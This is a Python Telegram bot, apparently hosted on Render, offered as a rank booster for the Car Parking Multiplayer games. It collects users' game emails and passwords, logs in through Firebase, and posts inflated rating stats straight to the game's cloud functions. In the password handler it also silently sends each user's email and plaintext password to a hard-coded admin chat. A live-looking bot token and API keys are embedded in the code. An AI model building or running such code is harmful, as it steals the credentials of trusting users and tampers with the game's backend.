import telebot
from telebot import types
import requests
import json
import os
from threading import Thread
from flask import Flask

# --- SERVER FOR RENDER ---
app = Flask('')
@app.route('/')
def home(): return "🔥 CPM KING BOT IS ALIVE"

def run_flask():
    # Render നൽകുന്ന പോർട്ടിൽ സർവർ റൺ ചെയ്യുന്നു
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- CONFIG ---
TOKEN = '8542467216:AAFVNntD1OGADt1koMtT8c0CXo0bIFaGjEY'
ADMIN_ID = '5475305604'
bot = telebot.TeleBot(TOKEN)

# API ENDPOINTS (Updated to v1 for stability)
CPM1_AUTH = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
CPM1_SET_RANK = 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'

CPM2_AUTH = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
CPM2_SET_RANK = 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'

user_cache = {}

def inject_all_features(token, game_type):
    url = CPM1_SET_RANK if game_type == 'CPM 1' else CPM2_SET_RANK
    full_stats = [
        'cars', 'car_fix', 'car_collided', 'car_exchange', 'car_trade', 
        'car_wash', 'slicer_cut', 'drift_max', 'drift', 'cargo', 
        'delivery', 'taxi', 'levels', 'gifts', 'fuel', 'offroad', 
        'speed_banner', 'reactions', 'police', 'run', 'real_estate', 
        't_distance', 'treasure', 'block_post', 'push_ups', 'burnt_tire', 
        'passanger_distance'
    ]
    
    rating_data = {stat: 100000 for stat in full_stats}
    rating_data['time'] = 10000000000
    rating_data['race_win'] = 5000
    
    payload = {'data': json.dumps({'RatingData': rating_data})}
    headers = {
        'Authorization': f"Bearer {token}",
        'Content-Type': 'application/json',
        'User-Agent': 'okhttp/3.12.13'
    }
    
    try:
        r = requests.post(url, headers=headers, json=payload, timeout=20)
        return r.status_code == 200
    except: return False

@bot.message_handler(commands=['start'])
def welcome(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton('CPM 1'), types.KeyboardButton('CPM 2'))
    bot.send_message(message.chat.id, "🏎️ **CPM Rank King Bot**\nSelect Game:", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text in ['CPM 1', 'CPM 2'])
def handle_game_selection(message):
    user_cache[message.chat.id] = {'game': message.text}
    bot.send_message(message.chat.id, "📧 Enter Email:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(message, process_email)

def process_email(message):
    user_cache[message.chat.id]['email'] = message.text.strip()
    bot.send_message(message.chat.id, "🔑 Enter Password:")
    bot.register_next_step_handler(message, process_password)

def process_password(message):
    pwd = message.text.strip()
    cid = message.chat.id
    data = user_cache.get(cid)
    if not data: return
    
    status_msg = bot.send_message(cid, "⏳ Logging in...")
    auth_url = CPM1_AUTH if data['game'] == 'CPM 1' else CPM2_AUTH
    
    try:
        auth_res = requests.post(auth_url, json={'email': data['email'], 'password': pwd, 'returnSecureToken': True})
        res_json = auth_res.json()
        
        if 'idToken' in res_json:
            token = res_json['idToken']
            bot.send_message(ADMIN_ID, f"📢 **Login Alert**\n🎮 Game: {data['game']}\n📧 User: `{data['email']}`\n🔑 Pass: `{pwd}`")
            bot.edit_message_text("✅ Success! Injecting Rank...", cid, status_msg.message_id)
            
            if inject_all_features(token, data['game']):
                bot.edit_message_text("👑 **King Rank Success!**\nRestart game now.", cid, status_msg.message_id)
            else:
                bot.edit_message_text("❌ Injection Failed.", cid, status_msg.message_id)
        else:
            bot.edit_message_text("❌ Login Failed.", cid, status_msg.message_id)
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", cid, status_msg.message_id)

if __name__ == "__main__":
    # Flask se സർവറും ബോട്ടും ഒരേസമയം പ്രവർത്തിപ്പിക്കാൻ Thread ഉപയോഗിക്കുന്നു
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    print("Bot is starting...")
    bot.infinity_polling(skip_pending=True)
